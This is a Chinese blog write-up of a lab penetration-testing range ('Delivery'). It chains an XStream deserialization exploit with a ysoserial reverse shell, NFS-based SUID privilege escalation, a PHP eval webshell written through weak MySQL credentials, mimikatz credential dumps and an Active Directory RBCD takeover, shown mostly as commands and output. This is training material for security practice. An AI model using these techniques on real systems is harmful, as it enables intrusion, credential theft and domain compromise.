---
title: "春秋云镜 Delivery Writeup"
date: 2023-08-17T09:41:26+08:00
lastmod: 2023-08-17T09:41:26+08:00
draft: false
author: "X1r0z"

tags: ['windows', 'domain']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

春秋云镜 Delivery Writeup

<!--more-->

## flag01

fscan

```shell
$ fscan ./fscan_darwin_arm64 -h 39.99.150.157

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 39.99.150.157   is alive
[*] Icmp alive hosts len is: 1
39.99.150.157:21 open
39.99.150.157:8080 open
39.99.150.157:22 open
39.99.150.157:80 open
[*] alive ports len is: 4
start vulscan
[*] WebTitle: http://39.99.150.157      code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
[+] ftp://39.99.150.157:21:anonymous
   [->]1.txt
   [->]pom.xml
[*] WebTitle: http://39.99.150.157:8080 code:200 len:3655   title:公司发货单
```

ftp pom.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.7.2</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>
    <groupId>com.example</groupId>
    <artifactId>ezjava</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>ezjava</name>
    <description>ezjava</description>
    <properties>
        <java.version>1.8</java.version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-thymeleaf</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>

        <dependency>
            <groupId>com.thoughtworks.xstream</groupId>
            <artifactId>xstream</artifactId>
            <version>1.4.16</version>
        </dependency>

        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>

</project>
```

8080 端口

![image-20230816154758498](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161547552.png)

![image-20230816154818160](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161548187.png)

XStream CVE-2021-29505

[https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.md)

```shell
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "bash -c {echo,[REDACTED]}|{base64,-d}|{bash,-i}"
```

反弹 shell

![image-20230816155349971](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161553994.png)

![image-20230816155405855](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161554880.png)

flag01

![image-20230816155431383](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161554408.png)

## flag02

内网 IP

```shell
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.13.14  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe23:274e  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:23:27:4e  txqueuelen 1000  (Ethernet)
        RX packets 76528  bytes 96326275 (96.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 27526  bytes 5209282 (5.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 728  bytes 62603 (62.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 728  bytes 62603 (62.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

fscan

```shell
root@ubuntu:/tmp# ./fscan -h 172.22.13.0/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
(icmp) Target 172.22.13.14    is alive
(icmp) Target 172.22.13.6     is alive
(icmp) Target 172.22.13.57    is alive
(icmp) Target 172.22.13.28    is alive
[*] Icmp alive hosts len is: 4
172.22.13.6:88 open
172.22.13.14:8080 open
172.22.13.28:8000 open
172.22.13.28:3306 open
172.22.13.28:445 open
172.22.13.6:445 open
172.22.13.28:139 open
172.22.13.6:139 open
172.22.13.28:135 open
172.22.13.6:135 open
172.22.13.28:80 open
172.22.13.57:80 open
172.22.13.57:22 open
172.22.13.14:80 open
172.22.13.14:22 open
172.22.13.14:21 open
[*] alive ports len is: 16
start vulscan
[*] NetInfo:
[*]172.22.13.28
   [->]WIN-HAUWOLAO
   [->]172.22.13.28
[*] NetBios: 172.22.13.6     [+] DC:XIAORANG\WIN-DC
[*] NetInfo:
[*]172.22.13.6
   [->]WIN-DC
   [->]172.22.13.6
[*] NetBios: 172.22.13.28    WIN-HAUWOLAO.xiaorang.lab           Windows Server 2016 Datacenter 14393
[*] WebTitle: http://172.22.13.28       code:200 len:2525   title:欢迎登录OA办公平台
[*] WebTitle: http://172.22.13.14:8080  code:200 len:3655   title:公司发货单
[*] WebTitle: http://172.22.13.14       code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
[*] WebTitle: http://172.22.13.57       code:200 len:4833   title:Welcome to CentOS
[*] WebTitle: http://172.22.13.28:8000  code:200 len:170    title:Nothing Here.
[+] ftp://172.22.13.14:21:anonymous
   [->]1.txt
   [->]pom.xml
[+] mysql:172.22.13.28:3306:root 123456
已完成 16/16
[*] 扫描结束,耗时: 16.181837985s
```

整理信息

```
172.22.13.14 本机
172.22.13.57 80,22,2049 NFS
172.22.13.28 8000,3306,80 WIN-HAUWOLAO
172.22.13.6 WIN-DC DC
```

NFS 默认 2049 端口

```shell
root@ubuntu:/tmp# ./fscan -h 172.22.13.0/24 -p 2049

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
(icmp) Target 172.22.13.14    is alive
(icmp) Target 172.22.13.6     is alive
(icmp) Target 172.22.13.28    is alive
(icmp) Target 172.22.13.57    is alive
[*] Icmp alive hosts len is: 4
172.22.13.57:2049 open
[*] alive ports len is: 1
start vulscan
已完成 1/1
[*] 扫描结束,耗时: 3.016650976s
```

NFS 提权, 参考文章: [https://xz.aliyun.com/t/11664](https://xz.aliyun.com/t/11664)

大致就是 NFS 配置不当导致文件权限也能被共享过去

```shell
root@ubuntu:/tmp# showmount -e 172.22.13.57
Export list for 172.22.13.57:
/home/joyce *
root@ubuntu:/tmp# mount -t nfs 172.22.13.57:/home/joyce joyce/ -o nolock
```

写 ssh 公钥

![image-20230816162410786](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161624819.png)

连接

![image-20230816162703119](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161627152.png)

SUID

```shell
[joyce@centos ~]$ find / -user root -perm -4000 -print 2>/dev/null
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/sbin/mount.nfs
/usr/bin/sudo
/usr/bin/chage
/usr/bin/at
/usr/bin/mount
/usr/bin/crontab
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/ftp
/usr/bin/umount
/usr/lib/polkit-1/polkit-agent-helper-1
[joyce@centos ~]$
```

试了一圈其实没啥可利用的, 然后根据上面的文章, 在原来的机器上编译如下源码

```c
#include<unistd.h>
void main()
{
        setuid(0);
        setgid(0);
        system("bash");
}
```

之后共享过去

```shell
root@ubuntu:/tmp/joyce# chmod -s pwn.c
root@ubuntu:/tmp/joyce# gcc pwn.c -o pwn
pwn.c: In function ‘main’:
pwn.c:3:9: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    3 |         setuid(0);
      |         ^~~~~~
pwn.c:4:9: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    4 |         setgid(0);
      |         ^~~~~~
pwn.c:5:9: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
    5 |         system("/bin/bash");
      |         ^~~~~~
root@ubuntu:/tmp/joyce# ls
pwn  pwn.c
root@ubuntu:/tmp/joyce# chmod +s pwn
root@ubuntu:/tmp/joyce# ls -al
total 52
drwx------  3  996  994  4096 Aug 16 16:36 .
drwxrwxrwt 13 root root  4096 Aug 16 16:36 ..
-rw-------  1  996  994   755 Aug 16 16:35 .bash_history
-rw-r--r--  1  996  994    18 Nov 25  2021 .bash_logout
-rw-r--r--  1  996  994   193 Nov 25  2021 .bash_profile
-rw-r--r--  1  996  994   231 Nov 25  2021 .bashrc
-rwsr-sr-x  1 root root 16784 Aug 16 16:36 pwn
-rw-r--r--  1 root root    83 Aug 16 16:35 pwn.c
drwxr-xr-x  2 root root  4096 Aug 16 16:23 .ssh
```

在 centos 机器上查看文件权限, 可以看到已经加上了 SUID 位

```shell
[joyce@centos ~]$ ls -al
总用量 52
drwx------  3 joyce joyce  4096 8月  16 16:36 .
drwxr-xr-x. 4 root  root   4096 8月  10 2022 ..
-rw-------  1 joyce joyce   755 8月  16 16:35 .bash_history
-rw-r--r--  1 joyce joyce    18 11月 25 2021 .bash_logout
-rw-r--r--  1 joyce joyce   193 11月 25 2021 .bash_profile
-rw-r--r--  1 joyce joyce   231 11月 25 2021 .bashrc
-rwsr-sr-x  1 root  root  16784 8月  16 16:36 pwn
-rw-r--r--  1 root  root     83 8月  16 16:35 pwn.c
drwxr-xr-x  2 root  root   4096 8月  16 16:23 .ssh
```

flag02

![image-20230816163709934](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161637971.png)

## flag03

域用户凭据

```shell
xiaorang.lab/zhangwen\QT62f3gBhK1
```

hint: Shadow Credentials

http://172.22.13.28/ OA 系统, 但是只是个静态文件

![image-20230816160627747](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161606771.png)

根据前面 fscan 的信息连上弱口令 mysql

尝试写 udf 但是失败了, 不过查看 plugin 目录发现是用 phpStudy 搭建的, 权限很大, 索性直接写 webshell

```shell
mysql> show variables like '%plugin%';
select '<?php eval($_REQUEST[1]);?>' into outfile 'C:\\phpstudy_pro\\WWW\\1.php';
```

![image-20230816164818289](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161648363.png)

flag03

![image-20230816164954620](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161649667.png)

## flag04

mimikatz

```shell
C:\phpstudy_pro\WWW> C:/Users/Public/mimikatz.exe "log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
mimikatz(commandline) # log
Using 'mimikatz.log' for logfile : OK
mimikatz(commandline) # privilege::debug
Privilege '20' OK
mimikatz(commandline) # sekurlsa::logonpasswords
Authentication Id : 0 ; 218848 (00000000:000356e0)
Session           : Service from 0
User Name         : chenglei
Domain            : XIAORANG
Logon Server      : WIN-DC
Logon Time        : 2023/8/16 15:44:52
SID               : S-1-5-21-3269458654-3569381900-10559451-1105
    msv :    
     [00000003] Primary
     * Username : chenglei
     * Domain   : XIAORANG
     * NTLM     : 0c00801c30594a1b8eaa889d237c5382
     * SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7
     * DPAPI    : 89b179dc738db098372c365602b7b0f4
    tspkg :    
    wdigest :    
     * Username : chenglei
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :    
     * Username : chenglei
     * Domain   : XIAORANG.LAB
     * Password : Xt61f3LBhg1
    ssp :    
    credman :    
Authentication Id : 0 ; 52889 (00000000:0000ce99)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/8/16 15:44:42
SID               : S-1-5-90-0-1
    msv :    
     [00000003] Primary
     * Username : WIN-HAUWOLAO$
     * Domain   : XIAORANG
     * NTLM     : b5cd3591a58e1169186bcdbfd4b6322d
     * SHA1     : 226ee6b5e527e5903988f08993a2456e3297ee1f
    tspkg :    
    wdigest :    
     * Username : WIN-HAUWOLAO$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :    
     * Username : WIN-HAUWOLAO$
     * Domain   : xiaorang.lab
     * Password : `k+hcEDFvtzoObj=>DvzxiNqwyEn;Eu-\zFVAh>.G0u%BqQ21FskHtJlW4)3is3V;7Iu)3B00kd1##IB'LLG6wSx6TR%m;`Nfr;;Hf8O'Szfl0Z=w+^,>0jR
    ssp :    
    credman :    
Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WIN-HAUWOLAO$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2023/8/16 15:44:42
SID               : S-1-5-20
    msv :    
     [00000003] Primary
     * Username : WIN-HAUWOLAO$
     * Domain   : XIAORANG
     * NTLM     : 4e01a53e6b0b751b19f854639026dea4
     * SHA1     : 1cefb2594978247a7d407927d7673aeed99f3825
    tspkg :    
    wdigest :    
     * Username : WIN-HAUWOLAO$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :    
     * Username : win-hauwolao$
     * Domain   : XIAORANG.LAB
     * Password : df 77 ca f0 e1 4b 40 fb a2 5d ab 82 40 b5 34 fb a0 40 ba ab ff 17 b0 a7 2e dc 45 b3 84 1c fc 5a 81 92 da cf a0 bf bf 19 60 24 97 40 c7 6e d3 dc fb 33 fc 74 8b c1 48 cb 6e 18 8e f4 32 0f 35 2a 09 0b 1c 73 ab 29 16 7c ff 94 f2 f2 ee 94 ad a2 8b b8 64 31 41 d1 0f a9 b1 2a b8 ff 0b cf 09 8d 4e 8d 38 1b b9 59 33 0f d0 66 f5 da 21 9c 7f 41 11 41 a1 fb bd b2 ef 20 7e 47 cf 9b 07 9b 60 dc af b0 09 fd 25 f5 51 6f ad a5 c4 82 5d 48 d7 e1 fa 5d ec 8c ae dc 2f 6f 36 3e 2a 92 65 dc 45 22 b7 c3 4a 81 1a 21 ae 66 1a 60 16 fa d9 8c e3 4a ab f4 b9 2d 80 00 24 f2 20 e0 20 1e 4d 3c 98 28 89 2a 25 95 9e 59 03 83 e0 6b f9 8e 61 b8 36 ae df c3 94 82 26 21 75 88 8f 27 ec 86 d6 c5 ef 0e 1b 8b 76 36 e1 93 b0 6c dd 27 f7 2e 78 37 cd b2 
    ssp :    
    credman :    
Authentication Id : 0 ; 218847 (00000000:000356df)
Session           : Service from 0
User Name         : chenglei
Domain            : XIAORANG
Logon Server      : WIN-DC
Logon Time        : 2023/8/16 15:44:52
SID               : S-1-5-21-3269458654-3569381900-10559451-1105
    msv :    
     [00000003] Primary
     * Username : chenglei
     * Domain   : XIAORANG
     * NTLM     : 0c00801c30594a1b8eaa889d237c5382
     * SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7
     * DPAPI    : 89b179dc738db098372c365602b7b0f4
    tspkg :    
    wdigest :    
     * Username : chenglei
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :    
     * Username : chenglei
     * Domain   : XIAORANG.LAB
     * Password : Xt61f3LBhg1
    ssp :    
    credman :    
Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2023/8/16 15:44:42
SID               : S-1-5-19
    msv :    
    tspkg :    
    wdigest :    
     * Username : (null)
     * Domain   : (null)
     * Password : (null)
    kerberos :    
     * Username : (null)
     * Domain   : (null)
     * Password : (null)
    ssp :    
    credman :    
Authentication Id : 0 ; 52864 (00000000:0000ce80)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/8/16 15:44:42
SID               : S-1-5-90-0-1
    msv :    
     [00000003] Primary
     * Username : WIN-HAUWOLAO$
     * Domain   : XIAORANG
     * NTLM     : 4e01a53e6b0b751b19f854639026dea4
     * SHA1     : 1cefb2594978247a7d407927d7673aeed99f3825
    tspkg :    
    wdigest :    
     * Username : WIN-HAUWOLAO$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :    
     * Username : WIN-HAUWOLAO$
     * Domain   : xiaorang.lab
     * Password : df 77 ca f0 e1 4b 40 fb a2 5d ab 82 40 b5 34 fb a0 40 ba ab ff 17 b0 a7 2e dc 45 b3 84 1c fc 5a 81 92 da cf a0 bf bf 19 60 24 97 40 c7 6e d3 dc fb 33 fc 74 8b c1 48 cb 6e 18 8e f4 32 0f 35 2a 09 0b 1c 73 ab 29 16 7c ff 94 f2 f2 ee 94 ad a2 8b b8 64 31 41 d1 0f a9 b1 2a b8 ff 0b cf 09 8d 4e 8d 38 1b b9 59 33 0f d0 66 f5 da 21 9c 7f 41 11 41 a1 fb bd b2 ef 20 7e 47 cf 9b 07 9b 60 dc af b0 09 fd 25 f5 51 6f ad a5 c4 82 5d 48 d7 e1 fa 5d ec 8c ae dc 2f 6f 36 3e 2a 92 65 dc 45 22 b7 c3 4a 81 1a 21 ae 66 1a 60 16 fa d9 8c e3 4a ab f4 b9 2d 80 00 24 f2 20 e0 20 1e 4d 3c 98 28 89 2a 25 95 9e 59 03 83 e0 6b f9 8e 61 b8 36 ae df c3 94 82 26 21 75 88 8f 27 ec 86 d6 c5 ef 0e 1b 8b 76 36 e1 93 b0 6c dd 27 f7 2e 78 37 cd b2 
    ssp :    
    credman :    
Authentication Id : 0 ; 23831 (00000000:00005d17)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2023/8/16 15:44:42
SID               : 
    msv :    
     [00000003] Primary
     * Username : WIN-HAUWOLAO$
     * Domain   : XIAORANG
     * NTLM     : 4e01a53e6b0b751b19f854639026dea4
     * SHA1     : 1cefb2594978247a7d407927d7673aeed99f3825
    tspkg :    
    wdigest :    
    kerberos :    
    ssp :    
    credman :    
Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WIN-HAUWOLAO$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2023/8/16 15:44:42
SID               : S-1-5-18
    msv :    
    tspkg :    
    wdigest :    
     * Username : WIN-HAUWOLAO$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :    
     * Username : win-hauwolao$
     * Domain   : XIAORANG.LAB
     * Password : df 77 ca f0 e1 4b 40 fb a2 5d ab 82 40 b5 34 fb a0 40 ba ab ff 17 b0 a7 2e dc 45 b3 84 1c fc 5a 81 92 da cf a0 bf bf 19 60 24 97 40 c7 6e d3 dc fb 33 fc 74 8b c1 48 cb 6e 18 8e f4 32 0f 35 2a 09 0b 1c 73 ab 29 16 7c ff 94 f2 f2 ee 94 ad a2 8b b8 64 31 41 d1 0f a9 b1 2a b8 ff 0b cf 09 8d 4e 8d 38 1b b9 59 33 0f d0 66 f5 da 21 9c 7f 41 11 41 a1 fb bd b2 ef 20 7e 47 cf 9b 07 9b 60 dc af b0 09 fd 25 f5 51 6f ad a5 c4 82 5d 48 d7 e1 fa 5d ec 8c ae dc 2f 6f 36 3e 2a 92 65 dc 45 22 b7 c3 4a 81 1a 21 ae 66 1a 60 16 fa d9 8c e3 4a ab f4 b9 2d 80 00 24 f2 20 e0 20 1e 4d 3c 98 28 89 2a 25 95 9e 59 03 83 e0 6b f9 8e 61 b8 36 ae df c3 94 82 26 21 75 88 8f 27 ec 86 d6 c5 ef 0e 1b 8b 76 36 e1 93 b0 6c dd 27 f7 2e 78 37 cd b2 
    ssp :    
    credman :    
mimikatz(commandline) # exit
Bye!
```

chenglei 位于 ACL Admin 组

![image-20230816165256875](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161652928.png)

BloodHound

```shell
proxychains bloodhound-python -u zhangwen -p 'QT62f3gBhK1' -d xiaorang.lab -c all -ns 172.22.13.6 --zip --dns-tcp
```

![image-20230816165935895](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161659951.png)

ACL Admins 组对 WIN-DC 具有 WriteDacl 权限, 那么可以直接写 DCSync / RBCD / Shadow Credentials

方法都差不多, 这里以 RBCD 为例

addcomputer

```shell
proxychains addcomputer.py xiaorang.lab/chenglei:'Xt61f3LBhg1' -dc-ip 172.22.13.6 -dc-host xiaorang.lab -computer-name 'TEST$' -computer-pass 'P@ssw0rd'
```

rbcd

```shell
$ proxychains rbcd.py xiaorang.lab/chenglei:'Xt61f3LBhg1' -dc-ip 172.22.13.6 -action write -delegate-to 'WIN-DC$' -delegate-from 'TEST$'
Impacket v0.12.0.dev1+20230803.144057.e2092339 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] TEST$ can now impersonate users on WIN-DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     TEST$        (S-1-5-21-3269458654-3569381900-10559451-1108)
```

getst

```shell
proxychains getST.py xiaorang.lab/'TEST$':'P@ssw0rd' -spn cifs/WIN-DC.xiaorang.lab -impersonate Administrator -dc-ip 172.22.13.6
```

flag04

![image-20230816170535776](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161705836.png)

一气呵成